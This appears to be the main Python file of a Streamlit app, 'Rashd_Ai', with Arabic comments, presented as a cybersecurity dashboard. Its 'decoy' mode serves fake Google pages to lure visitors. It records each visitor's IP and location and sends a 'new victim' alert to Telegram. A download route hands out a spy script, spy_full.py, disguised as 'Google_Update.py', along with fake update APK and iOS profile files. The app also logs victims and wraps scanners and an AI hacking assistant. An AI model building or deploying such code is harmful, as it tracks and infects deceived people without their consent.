import streamlit as st
import requests
import json
import os
from datetime import datetime
import victim_logger
import config
import base64
import uuid

# إعداد متغيرات البيئة
os.environ["TAVILY_API_KEY"] = config.get_key("TAVILY_API_KEY")
os.environ["GROQ_API_KEY"] = config.get_key("GROQ_API_KEY")
os.environ["GEMINI_API_KEY"] = config.get_key("GEMINI_API_KEY")

# استيراد الوحدات
try:
    import domain_osint
    import ai_pentest
    import port_scanner
    import network_mapper
    import google_dork
    import vuln_scanner
    import darkweb_search
    import ai_threat
    import email_osint
    import phone_osint
    import website_scan
    import username_osint
    import geoip_osint
    import attack_surface
    import ai_analysis
    import report_generator
    from ai_hacking import AIHackingAssistant
except ImportError as e:
    st.warning(f"بعض المكتبات مفقودة: {e}")

# إعدادات الصفحة
st.set_page_config(page_title="Rashd_Ai - CyberShield Pro", page_icon="🛡️", layout="wide")

# تصميم الواجهة المطابق للصورة (CSS)
st.markdown("""
    <style>
    .main { background-color: #0e1117; }
    
    /* تنسيق العنوان الكبير كما في الصورة */
    .main-title {
        font-size: 60px !important;
        font-weight: 800 !important;
        color: white !important;
        margin-bottom: 0px !important;
        padding-bottom: 0px !important;
    }
    .sub-title {
        font-size: 40px !important;
        color: white !important;
        margin-top: -20px !important;
    }
    
    /* تنسيق التبويبات (Tabs) لتطابق الصورة */
    .stTabs [data-baseweb="tab-list"] {
        gap: 20px;
        border-bottom: 2px solid #333;
    }
    .stTabs [data-baseweb="tab"] {
        height: 60px;
        background-color: transparent !important;
        border: none !important;
        color: white !important;
        font-size: 20px !important;
        font-weight: 600 !important;
    }
    .stTabs [aria-selected="true"] {
        border-bottom: 4px solid #ff4b4b !important;
        color: #ff4b4b !important;
    }
    
    /* إخفاء واجهة Streamlit */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    .stApp [data-testid="stToolbar"] {display: none;}
    
    /* تنسيق الأزرار */
    .stButton>button {
        width: 100%;
        border-radius: 8px;
        height: 3.5em;
        background-color: #1e293b;
        color: white;
        border: 1px solid #334155;
        font-weight: bold;
    }
    .stButton>button:hover {
        background-color: #ff4b4b;
        border: 1px solid #ff4b4b;
        transform: translateY(-2px);
        transition: 0.3s;
    }
    </style>
    """, unsafe_allow_html=True)

# دالة جلب الـ IP العام
def get_real_public_ip():
    try:
        headers = st.context.headers
        if "X-Forwarded-For" in headers:
            ip = headers["X-Forwarded-For"].split(",")[0].strip()
            if not ip.startswith(("10.", "172.", "192.168.")): return ip
        return requests.get("https://api.ipify.org", timeout=5).text
    except: return "Unknown"

# دالة إرسال التنبيه
def send_telegram_alert(ip, trap_name, device="Unknown"):
    token = config.get_key("TELEGRAM_BOT_TOKEN")
    chat_id = config.get_key("TELEGRAM_CHAT_ID")
    if not token or not chat_id: return
    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if res.get("status") == "success":
            geo_data = {"country": res.get("country"), "city": res.get("city"), "isp": res.get("isp")}
    except: pass
    msg = f"🎯 تنبيه: ضحية جديدة!\n📍 IP: {ip}\n🌍 {geo_data['country']} - {geo_data['city']}\n🏢 {geo_data['isp']}\n📱 {device}\n🎯 {trap_name}"
    try: 
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": msg})
        victim_logger.log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], trap_name)
    except: pass

# وضع التمويه
query_params = st.query_params
if "decoy" in query_params:
    ip = get_real_public_ip()
    if "alert_sent" not in st.session_state:
        send_telegram_alert(ip, query_params.get("trap", "Google Decoy"))
        st.session_state.alert_sent = True
    with open("index.html", "r", encoding="utf-8") as f: st.components.v1.html(f.read(), height=1000)
    st.stop()

# التحميل
if "download" in query_params:
    device = query_params.get("device", "pc")
    send_telegram_alert(get_real_public_ip(), f"Download ({device})", device)
    if device == "android": f, c, m = "Google_Update.apk", b"APK", "application/vnd.android.package-archive"
    elif device == "ios": f, c, m = "Google_Update.mobileconfig", b"Config", "application/x-apple-aspen-config"
    else: f, c, m = "Google_Update.py", open("spy_full.py", "rb").read() if os.path.exists("spy_full.py") else b"Py", "application/octet-stream"
    st.download_button("تحميل", c, file_name=f, mime=m)
    st.stop()

# تسجيل الدخول
if "authenticated" not in st.session_state: st.session_state.authenticated = False
if not st.session_state.authenticated:
    st.title("🛡️ Rashd_Ai Login")
    with st.form("login"):
        u, p = st.text_input("User"), st.text_input("Pass", type="password")
        if st.form_submit_button("Login"):
            if u == config.ADMIN_USERNAME and p == config.ADMIN_PASSWORD:
                st.session_state.authenticated = True
                st.rerun()
            else: st.error("Error")
    st.stop()

# القائمة الجانبية (Sidebar)
with st.sidebar:
    st.image("https://img.icons8.com/fluency/96/shield.png", width=80)
    st.title("🛡️ Rashd_Ai Pro")
    st.markdown("---")
    
    st.subheader("🔑 API Keys")
    groq_key = st.text_input("Groq API Key", value=config.get_key("GROQ_API_KEY"), type="password")
    gemini_key = st.text_input("Gemini API Key", value=config.get_key("GEMINI_API_KEY"), type="password")
    tavily_key = st.text_input("Tavily API Key", value=config.get_key("TAVILY_API_KEY"), type="password")
    tg_token = st.text_input("Telegram Token", value=config.get_key("TELEGRAM_BOT_TOKEN"), type="password")
    tg_chat = st.text_input("Telegram Chat ID", value=config.get_key("TELEGRAM_CHAT_ID"))
    
    if st.button("Save Keys"):
        config.set_key("GROQ_API_KEY", groq_key)
        config.set_key("GEMINI_API_KEY", gemini_key)
        config.set_key("TAVILY_API_KEY", tavily_key)
        config.set_key("TELEGRAM_BOT_TOKEN", tg_token)
        config.set_key("TELEGRAM_CHAT_ID", tg_chat)
        st.success("Keys Saved!")
        st.rerun()
        
    st.markdown("---")
    if st.button("🚪 Logout"):
        st.session_state.authenticated = False
        st.rerun()

# الواجهة الرئيسية (مطابقة للصورة)
st.markdown('<p class="sub-title">لوحة تحكم</p>', unsafe_allow_html=True)
st.markdown('<p class="main-title">Rashd_Ai 🔗</p>', unsafe_allow_html=True)

# التبويبات بأسماء وأيقونات مطابقة للصورة
tabs = st.tabs([
    "🎯 المصيدة", 
    "📄 التقارير", 
    "💡 الخطة", 
    "🚨 التهديدات", 
    "🌐 الشبكة",
    "🧠 المساعد الذكي"
])

# 1. المصيدة (Dashboard & Traps)
with tabs[0]:
    victims = victim_logger.get_all_victims()
    c1, c2, c3 = st.columns(3)
    c1.metric("إجمالي الضحايا", len(victims))
    c2.metric("أدوات نشطة", "18")
    c3.metric("حالة النظام", "Online ✅")
    
    st.subheader("🎯 نظام المصيدة والتمويه")
    tid = st.text_input("اسم المصيدة", value="Google_Trap")
    st.code(f"https://rashdai.streamlit.app/?decoy=google&trap={tid}")
    
    st.subheader("📊 سجل الضحايا الأخير")
    if victims: st.table(victims[:10])
    else: st.info("لا يوجد ضحايا مسجلين بعد.")

# 2. التقارير
with tabs[1]:
    st.header("📄 توليد التقارير الأمنية")
    if st.button("توليد تقرير PDF شامل"):
        try:
            path = report_generator.generate_full_report()
            if path:
                with open(path, "rb") as f:
                    st.download_button("تحميل التقرير", f, file_name="Security_Report.pdf")
        except: st.error("الأداة غير متوفرة حالياً")

# 3. الخطة
with tabs[2]:
    st.header("💡 خطة الاختراق والتحصين")
    target = st.text_input("أدخل الهدف لتوليد الخطة")
    if st.button("توليد الخطة الذكية"):
        try: st.write(ai_pentest.generate_plan(target))
        except: st.error("خطأ في توليد الخطة")

# 4. التهديدات
with tabs[3]:
    st.header("🚨 تحليل التهديدات السيبرانية")
    threat_data = st.text_area("أدخل بيانات التهديد للتحليل")
    if st.button("بدء تحليل التهديد"):
        try: st.write(ai_threat.analyze(threat_data))
        except: st.error("خطأ في التحليل")

# 5. الشبكة
with tabs[4]:
    st.header("🌐 فحص الشبكة والمنافذ")
    net_tabs = st.tabs(["🔌 فحص منافذ", "🗺 خريطة شبكة", "⚠️ فحص ثغرات"])
    with net_tabs[0]:
        ip = st.text_input("IP للفحص")
        if st.button("بدء فحص المنافذ"):
            try: st.write(port_scanner.scan(ip))
            except: st.error("خطأ في الفحص")
    with net_tabs[1]:
        ip_map = st.text_input("IP لرسم الخريطة")
        if st.button("رسم الخريطة"):
            try:
                path = network_mapper.map_network(ip_map)
                if path: st.image(path)
            except: st.error("خطأ في الرسم")
    with net_tabs[2]:
        ip_vuln = st.text_input("الهدف لفحص الثغرات")
        if st.button("فحص الثغرات"):
            try: st.write(vuln_scanner.scan(ip_vuln))
            except: st.error("خطأ في الفحص")

# 6. المساعد الذكي (Chat)
with tabs[5]:
    st.header("🧠 مساعد Rashd_Ai الذكي")
    if "messages" not in st.session_state: st.session_state.messages = []
    
    with st.container(height=400):
        for msg in st.session_state.messages:
            with st.chat_message(msg["role"]):
                st.markdown(msg["content"])
    
    if prompt := st.chat_input("كيف يمكنني مساعدتك؟"):
        st.session_state.messages.append({"role": "user", "content": prompt})
        with st.chat_message("user"): st.markdown(prompt)
        with st.chat_message("assistant"):
            try:
                assistant = AIHackingAssistant()
                response = assistant.chat(prompt)
            except Exception as e:
                response = f"❌ خطأ في الاتصال: {str(e)}"
            st.markdown(response)
        st.session_state.messages.append({"role": "assistant", "content": response})
        st.rerun()
